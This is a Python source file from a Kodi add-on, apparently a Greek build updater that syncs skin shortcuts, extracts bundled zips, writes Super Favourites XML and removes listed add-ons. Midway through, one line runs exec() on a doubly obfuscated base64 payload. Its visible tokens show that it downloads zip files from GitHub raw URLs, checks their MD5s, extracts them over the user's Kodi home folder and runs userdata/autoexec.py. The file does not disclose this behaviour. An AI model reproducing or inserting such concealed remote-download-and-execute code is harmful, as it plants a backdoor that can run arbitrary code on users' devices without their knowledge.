# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys
from resources.lib import extract, addoninstall, addonlinks, notify, monitor
from contextlib import contextmanager
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')
shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
skinshortcutsdir = xbmcvfs.translatePath('special://home/userdata/addon_data/script.skinshortcuts/')

addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []

def percentage(part, whole):
    return 100 * float(part)/float(whole)

def skinshortcuts():
    xbmcgui.Window(xbmcgui.getCurrentWindowId()).setProperty(addonid, "True")
    new_ver = addon.getAddonInfo('version')
    old_ver = addon.getSetting('shortcutsver')

    if old_ver == '' or old_ver is None:
        old_ver = '0'

    if str(new_ver) == str(old_ver):
        return

    if not os.path.exists(skinshortcutsdir):
        os.makedirs(skinshortcutsdir)

    dirs, files = xbmcvfs.listdir(shortupdatedir)
    total = len(files)

    if total == 0:
        addon.setSetting('shortcutsver', new_ver)
        return

    start = 0
    notify.progress('Ξεκινάει ο έλεγχος των συντομεύσεων')
    dp.create(addontitle, lang(30001))
    for item in files:
        if monitor.waitForAbort(0.2):
            dp.close()
            sys.exit()
        start += 1
        perc = int(percentage(start, total))
        # if 'mainmenu' in item:
            # if addon.getSetting('overwritemain') == 'false' and not (str(old_ver) == '19.0.9' or str(old_ver) == '19.0.8' or str(old_ver) == '19.0.7' or str(old_ver) == '19.0.6' or str(old_ver) == '19.0.5' or str(old_ver) == '19.0.4' or str(old_ver) == '19.0.3' or str(old_ver) == '19.0.2' or str(old_ver) == '19.0.1' or str(old_ver) == '19.0.0'):
                # continue
        if item.endswith('.hash'):
            skinhashpath = os.path.join(skinshortcutsdir, item)
            continue
        old  = os.path.join(skinshortcutsdir, item)
        new = os.path.join(shortupdatedir, item)
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item)
        if matchmd5(old, new):
            continue
        if item.endswith('.xml') and addon.getSetting('keepmyshortcuts') == 'true' and not(str(old_ver) == '19.0.9' or str(old_ver) == '19.0.8' or str(old_ver) == '19.0.7' or str(old_ver) == '19.0.6' or str(old_ver) == '19.0.5' or str(old_ver) == '19.0.4' or str(old_ver) == '19.0.3' or str(old_ver) == '19.0.2' or str(old_ver) == '19.0.1' or str(old_ver) == '19.0.0'):
            customshortcuts_list = []
            with xbmcvfs.File(old, 'r') as oldcontent:
                a_old = oldcontent.read()
                a_old = a_old.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                content = parseDOM(a_old, 'shortcut')
                for shortcut in content:
                    try:
                        defaultid = parseDOM(shortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    if defaultid.startswith(addonid):
                        continue
                    try:
                        label = parseDOM(shortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(shortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(shortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(shortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    action = parseDOM(shortcut, 'action')[0]
                    customshortcuts_list.append('\n\t<shortcut>\n')
                    customshortcuts_list.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    customshortcuts_list.append('\t\t<label>'+label+'</label>\n')
                    customshortcuts_list.append('\t\t<label2>'+label2+'</label2>\n')
                    customshortcuts_list.append('\t\t<icon>'+icon+'</icon>\n')
                    customshortcuts_list.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    customshortcuts_list.append('\t\t<action>'+action+'</action>\n')
                    customshortcuts_list.append('\t</shortcut>')
            with xbmcvfs.File(new, 'r') as newcontent:
                a_new = newcontent.read()
                a_new = a_new.replace('<shortcuts>', '<shortcuts>' + ''.join(customshortcuts_list))
            with xbmcvfs.File(old, 'w') as f_new:
                f_new.write(a_new)
                changes.append(item)
        else:
            try:
                xbmcvfs.copy(new, old)
                changes.append(item)
            except:
                xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
                continue
        # xbmc.sleep(200)

    if len(changes) > 0:
        xbmcvfs.delete(skinhashpath)
    dp.close()
    addon.setSetting('shortcutsver', new_ver)
    notify.progress('Η ενημέρωση των συντομεύσεων ολοκληρώθηκε')
    return True


def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        xbmc.executebuiltin('UpdateAddonRepos()')
        return
    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        xbmc.executebuiltin('UpdateAddonRepos()')
        return

    zipchanges = []
    for item in files:
        if monitor.waitForAbort(0.5):
            sys.exit()
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        # xbmc.sleep(1000)
        dp.close()

    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    xbmc.executebuiltin('UpdateAddonRepos()')
    addon.setSetting('updatesver', new_upd)
    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    return True


def SFxmls():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('mainxmlsver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        return
    notify.progress('Ξεκινάει η ενημέρωση SFxmls')
    xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
    mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
    shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))

    for item in xmllinks:
        if monitor.waitForAbort(0.5):
            sys.exit()
        skin_xml = os.path.join(shortupdatedir, item[0])
        folder_xml = os.path.join(mainfolders, item[1])
        if not os.path.exists(folder_xml):
            os.makedirs(folder_xml)

        main_xml = os.path.join(folder_xml, 'favourites.xml')
        FAV_list = []
        with xbmcvfs.File(skin_xml, 'r') as xml:
            infos = xml.read()
            shortcuts = parseDOM(infos, 'shortcut')
            for shortcut in shortcuts:
                label = parseDOM(shortcut, 'label')[0]
                label2 = parseDOM(shortcut, 'label2')[0]
                if label.isdigit() is True: label = label2
                thumb = parseDOM(shortcut, 'thumb')[0]
                if thumb == '' or '<action>Ac' in thumb:
                    thumb = parseDOM(shortcut, 'icon')[0]
                else:
                    thumb = thumb
                action = parseDOM(shortcut, 'action')[0]
                if action.startswith('ActivateWindow(10025,"plugin://plugin.program.super.favourites'):
                    action = action.replace('ActivateWindow(10025,', 'RunPlugin(')


                newsf = '<favourite name="{}" thumb="{}" fanart="none">{}</favourite>'.\
                    format(label, thumb, action)
                xbmc.log('FAVOURITE: %s' % newsf)
                FAV_list.append(newsf)

        f_xml = []

        f_xml.append('<favourites>\n')
        for fav in FAV_list:
            f_xml.append('\t' + fav + '\n')

        f_xml.append('</favourites>')
        with xbmcvfs.File(main_xml, 'w') as outF:
            outF.write("".join(f_xml))

        # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
    addon.setSetting('mainxmlsver', new_upd)
    notify.progress('Η ενημέρωση των SFxmls ολοκληρώθηκε')
    return True

def addon_remover():
    for removeid in removeaddonslist:
        if monitor.waitForAbort(0.5):
            sys.exit()
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True


exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MjEoImQgNmE7ZCBjIik7MjEoKDk0IDlkLDk2Oig5NCA4YSxiLGY6NmEuNmYoOGEsYixmLjYzKCc0Ni04JykpKSg5MiIoWzAtOWEtZl0rKSIsOTQgOTg6OWQoOTgsOTYpLGMuMWEoIjliPSIpKSkoOTQgYSxiOmJbMzAoIjhkIithLjUyKDEpLDE2KV0sIjB8MXwyZnwyNnw0fDV8MmR8M3w4fDI1fDVjfDd8NTl8OTl8Mzh8ZnwxMHw5Y3w0MXw4ZXw2NXw2fDE2fDMzfDVlfDc4fDcxfDFmfDI0fGV8Mjl8MmN8MjB8MTN8MTR8Mzl8MWJ8MWN8MWV8Njh8NmJ8NzR8Mjd8Mjh8OTB8OWZ8OWV8OTV8OXw1ZnwzMnwzY3wzZHw2OXw2Mnw0N3w5M3w0YXw0Ynw0Y3wxMXw1MHw1M3w1NHw5N3wxNXwxN3w3ZnwxOHw3N3w4Nnw1ZHw4Y3w2MHw2MXw2NHw4YnwxZHw2ZHwyYXwyYnwzMXwzNHwzZXwzN3w2M3w5Mnw3YXwzYnw3Y3wzNXw4MXwzZnw0MHw0Mnw0M3w0NHw0NXw0OHw0OXw0ZXw0Znw1MXwzYXw1Nnw1N3w1OHw4N3w1YXw1YnwzNnw5MXw4Znw2Nnw2N3w4OXxhMHw2Y3w4OHw2ZXwzMHw3Nnw3Mnw3M3w3NXw3MHw3OXwyMnw3YnwyfDgzfDdkfDdlfDgwfDgyfDg0fDg1fDQ2fDRkfDE5fDIzfDJlfDEyIi41NSgifCIpKSk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|local_temp_filename|local_md5_filename|4|5|remote_md5_url|translatePath|8|iter_content|a|b|base64|import|status_code|f|10|addonlinks|remote_md5|chunk_size|reporescue|BUILD_MD5S|16|gggbbbuuu|RunScript|local_md5|b64decode|totalurls|autoexec|makedirs|userdata|DOWNLOAD|20|exec|continue|requests|starturl|progress|filename|timeout|special|tmp_md5|extract|filemd5|monitor|addonid|success|xbmcvfs|int|create|32|exists|append|rename|giturl|encode|notify|except|FAILED|github|update|DELETE|RENAME|rsplit|verify|delete|return|stream|NEEDED|ignore|utf|write|sleep|30009|30008|30007|30006|close|30010|30011|magic|https|group|codes|chunk|split|ascii|False|URLS|lang|1024|None|xbmc|True|path|exit|home|join|repo_rescue|decode|read|addontitle|HOME|else|urls|perc|re|File|main|pass|text|sub|def|log|tmp|x4b|not|x50|zip|and|url|ZIP|md5|500|for|NOT|MD5|sys|raw|get|com|len|x04|x03|try|wb|in|rb|o|Finished|dp|0x|folder|py|os|ok|r|percentage|lambda|allNoProgress|y|TO|m|waitForAbort|9a|N2QgMjIoKToKCTI3ID0gM2MuNmEKCTZlID0gJzY2Oi8vNTguODYvNDIvMjIvODUvNzUvMzYuNzknCgkyNy41Mig2ZSkKCTEzID0gNzEKCTQ2OgoJCTExIDI5IDJjLjE4LjE3KDIuYigxMykpOgoJCQkyYy40ZCgyLmIoMTMpKQoJMjM6CgkJNGUKCTI0ID0gODIoMjcpCgkxYyA9IDAKCWUuOShjKDNiKSkKCSMgNDguNTEoMTQsIGMoM2IpKQoJNTkgMTkgNzYgMjc6CgkJMTEgMWYuZCgwLjUpOgoJCQk0My4zMSgpCgkJMWMgKz0gMQoJCTM1ID0gNzgoMzgoMWMsIDI0KSkKCQkzID0gMTkuNWMoJy8nLCAxKVstMV0KCQkxMSAyOSAzOgoJCQk3ZgoJCTc0ID0gMmMuMTguNGEoMTMsIDMpCgkJODEgPSA3NCArICIuN2EiCgkJNyA9IDJjLjE4LjRhKDQxLCAoMyArICIuNTciKSkKCQkxNSA9IDE5ICsgIi41NyIKCgkJOGIgPSAyLjI4KDcsIjczIikuNGIoKVs6MzJdCgkJOGUgPSA2ZAoJCTQ2OgoJCQk1NiA9IDhjLjViKDE1LCAyYT0xMCkKCQkJMTEgNTYuMWQgPT0gOGMuM2UuNmY6CgkJCQk4ZSA9IDU2Ljc3LjU0KCc2OCcsICc2MScpWzozMl0uNTUoJzg5LTgnKQoJCTIzOgoJCQk0ZQoKCQkxMSA4YiA0NSA4ZSA0NSA4YiA9PSA4ZToKCQkJYS4xYSgoIlslMmVdIDFiIDgzIDYwOiAiICUgNikgKyAxOSkKCQkJN2YKCQlmID0gMi4yOCg4MSwiNmIiKQoJCWUuOSgoYygzYSkrIi4uLiUyZSIpICUgMykKCQkjIDQ4LjMzKDM1LCAxNCwgKGMoM2EpKyIuLi4lMmUiKSAlIDMpCgkJNDY6CgkJCTU2ID0gOGMuNWIoMTksIDVmPTQ3LCA1ZD02OSwgMmE9MjApCgkJCTExIDU2LjFkID09IDhjLjNlLjZmOgoJCQkJMjEgPSAxNiAqIDZjCgkJCQk1OSAzZiA3NiA1Ni4zMCgyMSk6CgkJCQkJOGQgPSBmLjM3KDNmKQoJCQkJZi44YSgpCgkJCTcyOgoJCQkJYS4xYSgoIlslMmVdIDY3IDQwIDFiOiAiICUgNikgKyAxOSkKCQkJCWYuOGEoKQoJCQkJMi4xMig4MSkKCQkJCTdmCgkJMjM6CgkJCWEuMWEoKCJbJTJlXSA2NyA0MCAxYjogIiAlIDYpICsgMTkpCgkJCWYuOGEoKQoJCQkyLjEyKDgxKQoJCQk3ZgoJCTFlID0gNTAoODEpCgoJCTExIDhlIDQ1IDFlICE9IDhlOgoJCQlhLjFhKCgiWyUyZV0gNjcgODQ6ICIgJSA2KSArIDE5KQoJCQk3ZgoKCQkxMSAyYy4xOC4xNyg3NCk6CgkJCThkID0gMi4xMig3NCkKCQkJMTEgMjkgOGQ6CgkJCQlhLjFhKCgiWyUyZV0gNjcgNDAgMzQ6ICIgJSA2KSArIDc0KQoJCQkJN2YKCgkJOGQgPSAyLjVhKDgxLDc0KQoJCTExIDI5IDhkOgoJCQlhLjFhKCgiWyUyZV0gNjcgNDAgNTM6ICIgJSA2KSArIDc0KQoJCQkyLjEyKDgxKQoJCQk3ZgoKCQkyLjI4KDcsIjZiIikuMzcoMWUpCgkJM2QgPSAyLjI4KDc0LCI3MyIpLjRiKDQpCgkJMTEgM2QgPT0gIlw3Y1w3Ylw4OFw4NyI6CgkJCTRmLjJmKDc0LCAxMykKCQkJZS45KCgiJTJlLi4uIitjKDM5KSkgJSAzKQoJCQkjIDQ4LjMzKDM1LCAxNCwgKCIlMmUuLi4iK2MoMzkpKSAlIDMpCgkJCSMgYS42Mig4MCkKCQkJMTEgMmMuMTguMTcoNzQpOgoJCQkJOGQgPSAyLjEyKDc0KQoJCQkJMTEgMjkgOGQ6CgkJCQkJYS4xYSgoIlslMmVdIDY3IDQwIDM0IDdlOiAiICUgNikgKyA3NCkKCQlhLjFhKCJbJTJlXSA0YyAlMmUiICUgKDYsIDMpKQoJIyA0OC44YSgpCgllLjkoYyg2MykpCgllLjkoYyg2NCkpCgkKCTExIDJjLjE4LjE3KDIuYignMmI6Ly80OS8yNi8yNS43MCcpKToKCQkxMSAxZi5kKDAuNSk6CgkJCTQzLjMxKCkKCQlhLjJkKCc0NCgyYjovLzQ5LzI2LzI1LjcwKScpCgkxMSAxZi5kKDAuNSk6CgkJNDMuMzEoKQoJZS45KGMoNjUpKQoJNWUgNDc|if|p|s|executebuiltin|local_filename".split("|")))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

